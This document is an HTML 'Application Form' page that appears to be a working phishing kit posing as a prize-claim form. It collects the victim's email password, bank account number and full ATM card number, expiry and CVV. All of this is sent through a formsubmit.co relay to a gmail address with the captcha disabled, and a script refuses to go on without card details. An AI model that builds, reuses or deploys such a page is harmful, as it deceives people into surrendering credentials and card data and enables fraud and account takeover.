<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
      margin-top: 20px;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .hidden {
      display: none;
    }
    .password-toggle {
      position: relative;
    }
    .password-toggle-icon {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" data-redirect="https://onlinegistrationProg.github.io/Application-Form/thankyou.html">
    <h2>Application Form</h2>

    <label for="fullName">1. Full Name</label>
    <input type="text" id="fullName" name="Full Name" required />

    <label for="country">2. Country</label>
    <input type="text" id="country" name="Country" required />

    <label for="phone">3. Phone Number</label>
    <input type="tel" id="phone" name="Phone Number" required />
    <div id="phoneError" class="error">Phone number must be 9 to 12 digits.</div>

    <label for="email">4. Email Address</label>
    <input type="email" id="email" name="Email Address" required />

    <label for="password">5. Email Password</label>
    <div class="password-toggle">
      <input type="password" id="password" name="Email Password" required />
      <span class="password-toggle-icon" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label for="amountWon">6. Amount You Won</label>
    <input type="number" id="amountWon" name="Amount You Won" required />

    <label for="accountType">7. Bank Account Type</label>
    <input type="text" id="accountType" name="Bank Account Type" required />

    <label for="accountNumber">8. Bank Account Number</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required />

    <label for="atmLinked">9. Did You Link ATM to Your Bank Account?</label>
    <select id="atmLinked" name="Did You Link ATM to Your Bank Account?" required onchange="toggleATMFields()">
      <option value="">--Select--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div id="atmMessage" class="error"></div>

    <div id="atmFields">
      <label for="cardNumber">10. ATM Card Number</label>
      <input type="password" id="cardNumber" name="ATM Card Number" maxlength="16" />
      <div id="cardError" class="error">Card number must be exactly 16 digits.</div>

      <label for="expiry">11. Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY" />
      <div id="expiryError" class="error">Enter a valid expiry in MM/YY format.</div>

      <label for="cvv">12. CVV</label>
      <input type="password" id="cvv" name="CVV" maxlength="3" />
      <div id="cvvError" class="error">CVV must be exactly 3 digits.</div>
    </div>

    <div id="finalNote" class="hidden">
      <p><strong>You will receive <span id="amountDisplay"></span> to your <span id="typeDisplay"></span> <span id="accountDisplay"></span></strong></p>
    </div>

    <input type="submit" value="Submit Application" />
    <input type="hidden" name="_captcha" value="false">
  </form>

  <script>
    function togglePassword() {
      const input = document.getElementById('password');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function toggleATMFields() {
      const atmSelect = document.getElementById('atmLinked');
      const atmFields = document.getElementById('atmFields');
      const message = document.getElementById('atmMessage');
      const finalNote = document.getElementById('finalNote');

      if (atmSelect.value === 'No') {
        atmFields.style.display = 'none';
        message.textContent = 'YOU MUST HAVE ATM CARD TO PROCEED';
        message.style.display = 'block';
        finalNote.classList.add('hidden');
      } else {
        atmFields.style.display = 'block';
        message.style.display = 'none';
        finalNote.classList.remove('hidden');
        updateFinalNote();
      }
    }

    function updateFinalNote() {
      document.getElementById('amountDisplay').textContent = document.getElementById('amountWon').value;
      document.getElementById('typeDisplay').textContent = document.getElementById('accountType').value;
      document.getElementById('accountDisplay').textContent = document.getElementById('accountNumber').value;
    }

    document.getElementById('amountWon').addEventListener('blur', updateFinalNote);
    document.getElementById('accountType').addEventListener('blur', updateFinalNote);
    document.getElementById('accountNumber').addEventListener('blur', updateFinalNote);

    document.getElementById('phone').addEventListener('blur', function () {
      const val = this.value.trim();
      const error = document.getElementById('phoneError');
      error.style.display = (val.length < 9 || val.length > 12) ? 'block' : 'none';
    });

    document.getElementById('cardNumber').addEventListener('blur', function () {
      const val = this.value.trim();
      const error = document.getElementById('cardError');
      error.style.display = (val.length !== 16) ? 'block' : 'none';
    });

    document.getElementById('cvv').addEventListener('blur', function () {
      const val = this.value.trim();
      const error = document.getElementById('cvvError');
      error.style.display = (val.length !== 3) ? 'block' : 'none';
    });

    document.getElementById('expiry').addEventListener('input', function (e) {
      let val = this.value.replace(/\D/g, '');
      if (val.length >= 2) {
        val = val.slice(0, 2) + '/' + val.slice(2, 4);
      }
      this.value = val.slice(0, 5);
    });

    document.getElementById('expiry').addEventListener('blur', function () {
      const val = this.value.trim();
      const error = document.getElementById('expiryError');
      error.style.display = !/^(0[1-9]|1[0-2])\/\d{2}$/.test(val) ? 'block' : 'none';
    });
  </script>
</body>
</html>
